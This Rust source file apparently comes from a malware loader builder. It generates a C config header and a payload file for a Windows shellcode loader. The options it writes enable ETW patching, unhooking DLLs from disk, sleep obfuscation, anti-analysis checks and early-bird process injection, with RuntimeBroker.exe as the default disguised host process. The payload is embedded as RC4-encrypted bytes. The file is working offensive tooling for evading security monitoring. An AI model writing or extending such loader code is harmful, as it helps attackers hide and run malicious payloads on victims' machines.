use std::{fmt::Write as FmtWrite, fs, io, path::Path};

use crate::{config::BuildConfig, crypto::KEY_SZ};

pub fn write_config_h(dir: &Path, hint: u8, payload_size: usize, cfg: &BuildConfig) -> io::Result<()> {
    let mut s = String::new();
    writeln!(s, "#pragma once\n").unwrap();
    writeln!(s, "#define KEY_SIZE     {KEY_SZ}").unwrap();
    writeln!(s, "#define HINT_BYTE    0x{hint:02X}").unwrap();
    writeln!(s, "#define PAYLOAD_SIZE {payload_size}").unwrap();

    if let Some(ref t) = cfg.target {
        writeln!(s, "#define TARGET_PROCESS L\"{t}\"").unwrap();
    }
    if cfg.aa        { writeln!(s, "#define ANTI_ANALYSIS").unwrap(); }
    if cfg.debug     { writeln!(s, "#define DEBUG").unwrap(); }
    if cfg.etw_patch { writeln!(s, "#define ETW_PATCH").unwrap(); }
    if cfg.unhook    { writeln!(s, "#define UNHOOK_DISK").unwrap(); }
    if cfg.sleep_obf { writeln!(s, "#define SLEEP_OBF").unwrap(); }
    if cfg.sleep_ms > 0 {
        writeln!(s, "#define SLEEP_MS {}", cfg.sleep_ms).unwrap();
    }
    if cfg.early_bird {
        writeln!(s, "#define INJECT_EARLY_BIRD").unwrap();
        writeln!(s, "extern unsigned short SPAWN_PROCESS[];").unwrap();
    }

    writeln!(s, "\nextern unsigned char Rc4CipherText[PAYLOAD_SIZE];").unwrap();
    writeln!(s, "extern unsigned char EncRc4Key[KEY_SIZE];").unwrap();

    fs::write(dir.join("loader_config.h"), s)
}

pub fn write_payload_c(dir: &Path, ct: &[u8], enc_key: &[u8], cfg: &BuildConfig) -> io::Result<()> {
    let mut s = String::new();
    writeln!(s, "#include \"loader_config.h\"").unwrap();
    writeln!(s, "#include <windows.h>\n").unwrap();

    if cfg.early_bird {
        let spawn = cfg.spawn.as_deref()
            .unwrap_or("C:\\Windows\\System32\\RuntimeBroker.exe");
        write!(s, "wchar_t SPAWN_PROCESS[] = L\"").unwrap();
        for c in spawn.chars() {
            if c == '\\' { s.push('\\'); }
            s.push(c);
        }
        writeln!(s, "\";\n").unwrap();
    }

    write!(s, "unsigned char Rc4CipherText[PAYLOAD_SIZE] = {{").unwrap();
    for (i, b) in ct.iter().enumerate() {
        if i % 16 == 0 { write!(s, "\n    ").unwrap(); }
        if i + 1 < ct.len() {
            write!(s, "0x{b:02X},").unwrap();
        } else {
            write!(s, "0x{b:02X}").unwrap();
        }
    }
    writeln!(s, "\n}};").unwrap();
    writeln!(s).unwrap();

    write!(s, "unsigned char EncRc4Key[KEY_SIZE] = {{").unwrap();
    for (i, b) in enc_key.iter().enumerate() {
        if i + 1 < enc_key.len() {
            write!(s, "0x{b:02X},").unwrap();
        } else {
            write!(s, "0x{b:02X}").unwrap();
        }
    }
    writeln!(s, "}};").unwrap();

    fs::write(dir.join("loader_payload.c"), s)
}
